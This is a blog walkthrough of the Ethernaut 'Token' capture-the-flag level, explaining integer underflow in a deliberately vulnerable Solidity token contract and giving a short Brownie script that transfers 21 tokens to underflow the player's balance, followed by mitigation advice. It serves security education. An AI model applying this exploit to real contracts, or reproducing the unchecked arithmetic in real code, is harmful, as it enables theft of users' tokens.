<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
<head>
  <meta charset="utf-8" />

  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <link rel="icon" href="/favicon.ico">

  <title>
    Ethernaut - Level 05 - Token - Security Pills
  </title>

  <meta name="description" content="Image courtesy of OpenZeppelin
Ethernaut 05 - Token This level from Ethernaut, called Token, is a good exercise to become familiar with the integer underflow and integer overflow concepts. In this challenge you are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large number of tokens.
// SPDX-License-Identifier: MIT pragma solidity ^0." /><meta name="generator" content="Hugo 0.120.4">

  <link rel="stylesheet" href="https://securitypills.github.io/css/main.css" />

  
  

  <meta property="og:title" content="Ethernaut - Level 05 - Token" />
<meta property="og:description" content="Image courtesy of OpenZeppelin
Ethernaut 05 - Token This level from Ethernaut, called Token, is a good exercise to become familiar with the integer underflow and integer overflow concepts. In this challenge you are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large number of tokens.
// SPDX-License-Identifier: MIT pragma solidity ^0." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://securitypills.github.io/articles/ethernaut-5-token/" /><meta property="article:section" content="articles" />
<meta property="article:published_time" content="2022-09-15T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-09-15T00:00:00+00:00" />



  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Ethernaut - Level 05 - Token"/>
<meta name="twitter:description" content="Image courtesy of OpenZeppelin
Ethernaut 05 - Token This level from Ethernaut, called Token, is a good exercise to become familiar with the integer underflow and integer overflow concepts. In this challenge you are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large number of tokens.
// SPDX-License-Identifier: MIT pragma solidity ^0."/>


  <meta itemprop="name" content="Ethernaut - Level 05 - Token">
<meta itemprop="description" content="Image courtesy of OpenZeppelin
Ethernaut 05 - Token This level from Ethernaut, called Token, is a good exercise to become familiar with the integer underflow and integer overflow concepts. In this challenge you are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large number of tokens.
// SPDX-License-Identifier: MIT pragma solidity ^0."><meta itemprop="datePublished" content="2022-09-15T00:00:00+00:00" />
<meta itemprop="dateModified" content="2022-09-15T00:00:00+00:00" />
<meta itemprop="wordCount" content="809">
<meta itemprop="keywords" content="" />

  <meta itemprop="name" content="Ethernaut - Level 05 - Token">
<meta itemprop="description" content="Image courtesy of OpenZeppelin
Ethernaut 05 - Token This level from Ethernaut, called Token, is a good exercise to become familiar with the integer underflow and integer overflow concepts. In this challenge you are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large number of tokens.
// SPDX-License-Identifier: MIT pragma solidity ^0."><meta itemprop="datePublished" content="2022-09-15T00:00:00+00:00" />
<meta itemprop="dateModified" content="2022-09-15T00:00:00+00:00" />
<meta itemprop="wordCount" content="809">
<meta itemprop="keywords" content="" />
</head><body class="flex relative h-full min-h-screen"><aside
  class="will-change-transform transform transition-transform -translate-x-full absolute top-0 left-0 md:relative md:translate-x-0 w-3/4 md:w-60 h-full min-h-screen p-3 bg-slate-50 dark:bg-slate-800 border-r border-slate-200 dark:border-slate-700 flex flex-col gap-2.5 z-20 sidebar">
  <p class="font-bold mb-5 flex items-center gap-2">
    <button
      aria-label="Close sidebar"
      class="md:hidden menu-trigger-close p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-6 w-6" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
  fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" />
  <line x1="18" y1="6" x2="6" y2="18" />
  <line x1="6" y1="6" x2="18" y2="18" />
</svg></button>
    <a href="https://securitypills.github.io/" class="px-2">
    <span>Security Pills</span>
    
    </a>
    
    <button
      aria-label="Toggle dark mode"
      class="dark-mode-toggle p-2 rounded border dark:border-slate-700 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
  fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" />
  <circle cx="12" cy="12" r="4" />
  <path d="M3 12h1M12 3v1M20 12h1M12 20v1M5.6 5.6l.7 .7M18.4 5.6l-.7 .7M17.7 17.7l.7 .7M6.3 17.7l-.7 .7" />
</svg></button>
  
  </p>

  
  <ul class="list-none flex flex-col gap-1">
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/" >
        <span>Home</span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/articles" >
        <span>Blog</span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/portfolio" >
        <span>Newsletter</span>
        
      </a>
    </li>
    
  </ul>

  <div class="flex-1"></div>

  <div class="revue-widget">
  <form action="https://embeds.beehiiv.com/3645f86f-e3bb-46cb-adec-b3b2f20c9411?slim=true" method="post" name="revue-form" target="_blank">
    <div class="text-bold text-sm">Subscribe to my newsletter</div>
    
    <p class="text-xs my-1 text-slate-500">A weekly newsletter for smart and curious people interested in security, technology, and smartcontracts</p>
    
    <div class="mt-2">
      <input type="email" class="w-full px-1.5 py-0.5 text-sm rounded border dark:border-slate-700 dark:bg-slate-600" name="member[email]" id="member_email" placeholder="Your email address...">
      <input type="submit" class="mt-2 w-full text-center text-sm bg-slate-800 text-white dark:bg-slate-50 dark:text-slate-800 py-1 rounded" name="member[subscribe]" id="member_submit" value="Subscribe">
    </div>
  </form>
</div>

  <ul class="list-none flex flex-wrap justify-center gap-1 pt-2 border-t border-slate-200 dark:border-slate-600">
    
  </ul>
</aside>

<div
  class="fixed bg-slate-700 bg-opacity-5 transition duration-200 ease-in-out inset-0 z-10 pointer-events-auto md:hidden left-0 top-0 w-full h-full hidden menu-overlay">
</div>

<button
  aria-label="Toggle Sidebar"
  class="md:hidden absolute top-3 left-3 z-10 menu-trigger p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-100"><svg class="h-6 w-6" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
  fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" />
  <line x1="4" y1="6" x2="20" y2="6" />
  <line x1="4" y1="12" x2="20" y2="12" />
  <line x1="4" y1="18" x2="16" y2="18" />
</svg></button><div class="flex-1">



<div class="flex h-screen relative">

  <section
    class="will-change-transform transform transition-transform -translate-x-[200%] absolute top-0 left-0 lg:relative
  lg:translate-x-0 lg:min-w-[400px] lg:w-1/4 h-full bg-slate-50 dark:bg-slate-800 border-r border-slate-200 dark:border-slate-700 lg:flex flex-col py-3 overflow-y-auto scroll-area">
    
    
    <a href="https://securitypills.github.io/articles/">
      <h2 class="font-bold mb-5 py-1 pl-12 pr-3 md:px-3">Articles</h2>
    </a>
    <div class="space-y-2.5">
      
      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/articles/ethernaut-7-force/">
        
        
        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 07 - Force</h3>
        <div
          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
          Image courtesy of OpenZeppelin
Ethernaut 07 - Force This level from Ethernaut, Force, provides us with an empty smart contract containing only some ASCII-art. The goal here is to send some ether to the contract using the selfdestruct() instruction.
# Level 07 - Force ### Source Code // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Force {/* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =Ã¸= / (______)__m_m) */} Before explaining why this smart contract is vulnerable, let&rsquo;s get familiarized with the function selfdestruct().
        </div>
      </a>
      
      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/articles/ethernaut-6-delegation/">
        
        
        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 06 - Delegation</h3>
        <div
          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
          Image courtesy of OpenZeppelin
Ethernaut 06 - Delegation This level from Ethernaut, Delegation, is about a special Solidity method called delegatecall(). To complete this level, we must understand how this low level function works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Delegate { address public owner; constructor(address _owner) public { owner = _owner; } function pwn() public { owner = msg.
        </div>
      </a>
      
      <a class="block px-3 py-4  bg-slate-900 dark:bg-slate-700 text-slate-50 "
        href="/articles/ethernaut-5-token/">
        
        
        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 05 - Token</h3>
        <div
          class="text-sm  text-slate-400  line-clamp-2">
          Image courtesy of OpenZeppelin
Ethernaut 05 - Token This level from Ethernaut, called Token, is a good exercise to become familiar with the integer underflow and integer overflow concepts. In this challenge you are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large number of tokens.
// SPDX-License-Identifier: MIT pragma solidity ^0.
        </div>
      </a>
      
      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/articles/ethernaut-4-telephone/">
        
        
        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 04 - Telephone</h3>
        <div
          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
          Image courtesy of OpenZeppelin
Ethernaut 04 - Telephone This level from Ethernaut, called Telephone, is a good exercise to learn the nuances between tx.origin and msg.sender and why you should never use tx.origin for authentication purposes:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } Solidity has a global variable, tx.
        </div>
      </a>
      
      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/articles/ethernaut-3-coinflip/">
        
        
        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 03 - Coinflip</h3>
        <div
          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
          Image courtesy of OpenZeppelin
Ethernaut 03 - Coinflip The third level in Ethernaut, CoinFlip, is a good exercise that will teach you how to exploit pseudo randomness implementations in smart contracts. This contract will require you to correctly guess the outcome of a coin flip ten times in a row:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.
        </div>
      </a>
      
      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/articles/ethernaut/">
        
        
        <h3 class="text-lg font-semibold mb-0.5">Ethernaut Challenges</h3>
        <div
          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
          Please read This is a work in progress article that will receive updates as we continue publishing detailed walkthroughs for each level.
Ethernaut is OpenZeppelin Web3/Solidity based wargame to learn about Ethereum smart contract security and become familiar with programming principles in Solidity.
Although the game was launched few years ago it has become a good place to start for those who are interested on security and smart contracts.
Challenges are currently running on the Rinkeby testnet and you will require to use a Rinkey Faucet to get free testnet ETH and test the smart contracts.
        </div>
      </a>
      
      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/articles/ethernaut-1-fallback/">
        
        
        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 01 - Fallback</h3>
        <div
          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
          Image courtesy of OpenZeppelin
Ethernaut 01 - Fallback The first level from Ethernaut is pretty straightforward and we will use it to become familiar with some Solidity concepts and the Brownie framework that we will use to complete this challenge.
The code for the smart contract that we must exploit is shown above:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallback { using SafeMath for uint256; mapping(address =&gt; uint) public contributions; address payable public owner; constructor() public { owner = msg.
        </div>
      </a>
      
      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/articles/ethernaut-2-fallout/">
        
        
        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 02 - Fallout</h3>
        <div
          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
          Image courtesy of OpenZeppelin
Ethernaut 02 - Fallout The goal for this level is to claim ownership of the contract, which has the following implementation:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, &#34;caller is not the owner&#34; ); _; } function allocate() public payable { allocations[msg.
        </div>
      </a>
      </div>
    </section>

  <div class="overflow-y-auto h-screen w-full">
    <article class="px-6 py-20 w-full mx-auto prose lg:prose-lg h-fit dark:prose-invert prose-img:mx-auto">

      
      <h1 class="!mb-2">Ethernaut - Level 05 - Token</h1>
      
      <p class="text-sm text-slate-500 !mb-8">September 15, 2022</p>
      

      

      <figure><img src="../images/token-5.svg"
         alt="Image courtesy of OpenZeppelin"/><figcaption>
            <p>Image courtesy of OpenZeppelin</p>
        </figcaption>
</figure>

<h2 id="ethernaut-05---token">Ethernaut 05 - Token</h2>
<p>This level from Ethernaut, called Token, is a good exercise to become familiar with the <strong>integer underflow</strong> and <strong>integer overflow</strong> concepts. In this challenge you are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a <strong>very large number of tokens</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Token</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">mapping</span>(<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint</span>) balances;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">public</span> totalSupply;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">uint</span> _initialSupply) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    balances[msg.sender] <span style="color:#f92672">=</span> totalSupply <span style="color:#f92672">=</span> _initialSupply;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#66d9ef">address</span> _to, <span style="color:#66d9ef">uint</span> _value) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>) {
</span></span><span style="display:flex;"><span>    require(balances[msg.sender] <span style="color:#f92672">-</span> _value <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    balances[msg.sender] <span style="color:#f92672">-=</span> _value;
</span></span><span style="display:flex;"><span>    balances[_to] <span style="color:#f92672">+=</span> _value;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#66d9ef">address</span> _owner) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint</span> balance) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> balances[_owner];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>As usual, lets start explaining some basic concepts before we dive deep into where is the vulnerability and how to exploit it.</p>
<p>The hint that we get for this challenge is to look up what an <code>odometer</code> is. At first it may not sound very clear to you but let&rsquo;s briefly explain why odometers may be related with this vulnerable contract.</p>
<p>Odometers have been used for decades in the form of milage counters in cars or to measure the flow of electricity in units call kilowatt-hour. These meters have been replaced to digital ones, but back in the days they used to be analog and had a maximum of six digits that could count up to 999999. Once they reached its maximum value the counter would start over at the next available value of the odometer, which would be 000000. This behavior is what we would call in programming as <strong>overflow</strong>.</p>
<p>Now imagine the opposite, think for a moment that your odometer has reached the value 000000 and your flow of electricity is negative. As you may have thought already, the odometer would count backwards and go to the next available value possible, which would be 999999. That&rsquo;s what we would call an <strong>underflow</strong></p>
<p>For the sake of simplicity, lets translate these concepts into Solidity and assume we have an unsigned 8-bit integer (<strong>uint8</strong>) which cannot hold negative values and only holds 8 bits of data that can be either 0 or 1, meaning we have 2^8 or 256 possible values ranging from 0 to 255.</p>
<figure><img src="../images/ethernaut-token-5-pic1.png"
         alt="Visual representation for an integer overflow and underflow"/><figcaption>
            <p>Visual representation for an integer overflow and underflow</p>
        </figcaption>
</figure>

<p>Based on this, when you attempt to make a <code>uint8</code> negative, this will trigger an underflow and it will turn out to contain a high value instead. The opposite happens when you attempt to increment a <code>uint8</code> that has 255 as value, triggering an overflow.</p>
<h2 id="where-is-the-vulnerability">Where is the vulnerability?</h2>
<p>Now that we have explained the basics on this type of vulnerability let&rsquo;s see where the problem with this contract is.</p>
<p>As you may have figured out already, the vulnerability in this contract is in the <code>transfer</code> method, concretely in the <code>require</code> statement:</p>
<div class="highlight" lineos="table" lineofstart="1"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">transfer</span>(<span style="color:#66d9ef">address</span> _to, <span style="color:#66d9ef">uint</span> _value) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>) {
</span></span><span style="display:flex; background-color:#3c3d38"><span>    require(balances[msg.sender] <span style="color:#f92672">-</span> _value <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>); <span style="color:#75715e">// _value &gt;= 21
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    balances[msg.sender] <span style="color:#f92672">-=</span> _value; <span style="color:#75715e">// 20 - 21 = 255
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    balances[_to] <span style="color:#f92672">+=</span> _value; <span style="color:#75715e">// 0 + 21 = 21
</span></span></span></code></pre></div><p>We must provide a value that causes an integer underflow and the only way to achieve this is by providing a value higher than 20 <strong>*</strong>.</p>
<p><strong>*</strong> <em>Every time we create a new instance of this contract we will receive as player a total of 20 tokens</em></p>
<p>The <code>require</code> statement would pass only if the value obtained from <code>balances[msg.sender] - _value</code> is greater or equal to 0. As we have mentioned earlier in this post, if we attempt to make a <code>uint8</code> variable negative, this will trigger an underflow and it will turn out to contain a high value instead. Based on this, it looks like the number <code>21</code> may help us achieve our purpose, as it will trigger an underflow (<em>remember that we have been granted 20 tokens</em>), setting our balance to <code>255</code>.</p>
<h2 id="hacking-the-contract">Hacking the contract</h2>
<p>The exploitation of this contract will be pretty straightforward and simple and it won&rsquo;t require creating a malicious contract. Instead, we will simply create a new instance of the vulnerable contract and call the <code>public</code> method, <code>transfer</code>, as shown below:</p>
<div class="highlight" lineos="table" lineofstart="1"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> brownie <span style="color:#f92672">import</span> accounts, config, interface
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">attack</span>(token, hacker, fake_account):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Balance before attack: </span><span style="color:#e6db74">{</span>token<span style="color:#f92672">.</span>balanceOf(hacker)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex; background-color:#3c3d38"><span>    tx <span style="color:#f92672">=</span> token<span style="color:#f92672">.</span>transfer(fake_account, <span style="color:#ae81ff">21</span>, {<span style="color:#e6db74">&#39;from&#39;</span>: hacker, <span style="color:#e6db74">&#39;allow_revert&#39;</span>:<span style="color:#66d9ef">True</span>})
</span></span><span style="display:flex;"><span>    tx<span style="color:#f92672">.</span>wait(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Balance after attack: </span><span style="color:#e6db74">{</span>token<span style="color:#f92672">.</span>balanceOf(hacker)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(target):
</span></span><span style="display:flex; background-color:#3c3d38"><span>    token <span style="color:#f92672">=</span> interface<span style="color:#f92672">.</span>TokenInterface(target)
</span></span><span style="display:flex;"><span>    hacker <span style="color:#f92672">=</span> accounts<span style="color:#f92672">.</span>add(config[<span style="color:#e6db74">&#39;wallets&#39;</span>][<span style="color:#e6db74">&#39;from_key&#39;</span>])
</span></span><span style="display:flex; background-color:#3c3d38"><span>    fake_account <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0x00000000000000000000000000000000cafebabe&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    attack(token, hacker, fake_account)
</span></span></code></pre></div><p>Once we execute the script, the <code>token.transfer</code> call will start the attack by sending <code>21</code> tokens to the vulnerable contract, and therefore, causing the <strong>integer underflow</strong> and completing this challenge.</p>
<h2 id="takeaways">Takeaways</h2>
<p>Although these vulnerabilities are no longer exploitable on recent versions of solidity (<code>v.0.8.0</code>) as underflow/overflow causes failing assertion by default, it is recommended to use vetted safe math libraries for arithmetic operations consistently throughout the smart contract system, such as openzeppelin&rsquo;s <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath"  target="_blank" rel="noopener" >SafeMath</a>.</p>

    </article>
  </div>

</div>


  </div>
<script type="text/javascript" src="/main.js" defer></script>


</body>

</html>